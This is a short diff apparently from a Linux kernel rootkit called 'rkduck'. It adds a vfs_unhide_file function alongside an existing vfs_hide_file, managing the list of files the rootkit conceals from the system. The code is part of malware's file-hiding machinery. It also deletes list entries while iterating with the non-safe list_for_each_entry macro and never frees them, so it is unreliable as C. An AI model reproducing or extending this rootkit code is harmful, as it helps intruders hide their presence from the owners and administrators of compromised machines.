@@ -189,3 +189,16 @@ void vfs_hide_file(char *path) {
 
     dbg("rkduck: Hide file -> %s\n", h_file->path);
 }
+
+void vfs_unhide_file(char *path) {
+    struct hidden_file *h_file;
+    int length;
+
+    list_for_each_entry(h_file, &hidden_files, list) {
+        if (!strncmp(path, h_file->path, strlen(path))) {
+            dbg("rkduck: Unhide file -> %s\n", h_file->path);
+            list_del(&(h_file->list));
+        }
+    }
+
+}
